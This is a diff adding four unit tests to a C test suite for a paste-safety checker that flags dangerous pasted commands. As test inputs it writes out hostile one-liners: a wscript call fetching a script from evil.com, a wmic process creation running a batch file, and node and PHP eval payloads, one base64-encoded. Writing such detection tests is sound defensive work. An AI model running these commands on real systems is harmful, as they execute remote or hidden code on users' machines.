@@ -169,6 +169,37 @@ static void test_paste_empty(void) {
     CHECK(v.score == 0, "empty is safe");
 }
 
+static void test_paste_wscript_remote(void) {
+    TEST("Paste: 'wscript http://evil.com/p.vbs' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste("wscript http://evil.com/payload.vbs");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "wscript remote execution must trigger P8");
+}
+
+static void test_paste_wmic_process(void) {
+    TEST("Paste: 'wmic process call create ...' → P8 LOLBin");
+    PasteVerdict v = hlse_check_paste(
+        "wmic process call create \"cmd.exe /c malware.bat\"");
+    CHECK(v.score >= 40 && (v.signals & PASTE_WINDOWS_LOLBIN),
+          "wmic process creation must trigger P8");
+}
+
+static void test_paste_node_eval(void) {
+    TEST("Paste: 'node -e ...' → P5 encoded payload");
+    PasteVerdict v = hlse_check_paste(
+        "node -e \"require('child_process').exec('id')\"");
+    CHECK(v.score >= 25 && (v.signals & PASTE_ENCODED_PAYLOAD),
+          "node -e one-liner must trigger P5");
+}
+
+static void test_paste_php_eval(void) {
+    TEST("Paste: 'php -r eval(base64_decode(...))' → P5");
+    PasteVerdict v = hlse_check_paste(
+        "php -r 'eval(base64_decode(\"c3lzdGVtKCdpZCcp\"));'");
+    CHECK(v.score >= 25 && (v.signals & PASTE_ENCODED_PAYLOAD),
+          "php -r one-liner must trigger P5");
+}
+
 /* ─── Network Safety ──────────────────────────────────────────────────── */
 
 static void test_network_runs(void) {
@@ -206,6 +237,10 @@ int main(void) {
     test_paste_base64();
     test_paste_history_evasion();
     test_paste_empty();
+    test_paste_wscript_remote();
+    test_paste_wmic_process();
+    test_paste_node_eval();
+    test_paste_php_eval();
 
     printf("\nNetwork safety:\n");
     test_network_runs();
